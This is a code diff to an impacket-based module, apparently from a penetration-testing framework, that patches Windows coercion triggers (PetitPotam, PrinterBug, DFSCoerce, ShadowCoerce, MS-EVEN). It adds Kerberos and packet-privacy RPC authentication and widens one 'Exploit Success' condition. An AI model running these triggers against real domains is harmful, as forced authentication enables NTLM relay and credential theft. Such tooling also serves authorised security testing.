@@ -1,6 +1,7 @@
 from impacket.dcerpc.v5 import transport, rprn, even
 from impacket.dcerpc.v5.ndr import NDRCALL, NDRSTRUCT, NDRPOINTER, NDRUniConformantArray, NDRPOINTERNULL
 from impacket.dcerpc.v5.dtypes import LPBYTE, USHORT, LPWSTR, DWORD, ULONG, NULL, WSTR, LONG, BOOL, PCHAR, RPC_SID
+from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE, RPC_C_AUTHN_LEVEL_PKT_PRIVACY
 
 from impacket.uuid import uuidtup_to_bin
 
@@ -236,6 +237,9 @@ class ShadowCoerceTrigger:
 
         rpctransport.setRemoteHost(target)
         dce = rpctransport.get_dce_rpc()
+        if doKerberos:
+            dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
+        dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
         self.context.log.debug("Connecting to {}".format(binding_params[pipe]["stringBinding"]))
         try:
             dce.connect()
@@ -347,10 +351,12 @@ class DFSCoerceTrigger:
 
         if doKerberos:
             rpctransport.set_kerberos(doKerberos, kdcHost=dcHost)
-        # if target:
 
         rpctransport.setRemoteHost(target)
         dce = rpctransport.get_dce_rpc()
+        if doKerberos:
+            dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
+        dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
         self.context.log.debug("Connecting to {}".format(binding_params[pipe]["stringBinding"]))
         try:
             dce.connect()
@@ -577,6 +583,9 @@ class PetitPotamtTrigger:
 
         rpctransport.setRemoteHost(target)
         dce = rpctransport.get_dce_rpc()
+        if doKerberos:
+            dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
+        dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
         self.context.log.debug("Connecting to {}".format(binding_params[pipe]["stringBinding"]))
         try:
             dce.connect()
@@ -809,6 +818,9 @@ class PrinterBugTrigger:
 
         rpctransport.setRemoteHost(target)
         dce = rpctransport.get_dce_rpc()
+        if doKerberos:
+            dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
+        dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
         self.context.log.debug("Connecting to {}".format(binding_params[pipe]["stringBinding"]))
         try:
             dce.connect()
@@ -849,7 +861,7 @@ class PrinterBugTrigger:
             request["dwPrinterLocal"] = 0
             dce.request(request)
         except Exception as e:
-            if str(e).find("rpc_s_access_denied") >= 0:
+            if str(e).find("rpc_s_access_denied") >= 0 or str(e).find("RPC_S_SERVER_UNAVAILABLE") >= 0:
                 self.context.log.debug("RpcRemoteFindFirstPrinterChangeNotificationEx Success")
                 self.context.log.highlight(f"Exploit Success, {pipe}\\RpcRemoteFindFirstPrinterChangeNotificationEx")
                 if not always_continue:
@@ -920,6 +932,9 @@ class MSEvenTrigger:
 
         rpctransport.setRemoteHost(target)
         dce = rpctransport.get_dce_rpc()
+        if doKerberos:
+            dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
+        dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
         self.context.log.debug("Connecting to {}".format(binding_params[pipe]["stringBinding"]))
         try:
             dce.connect()
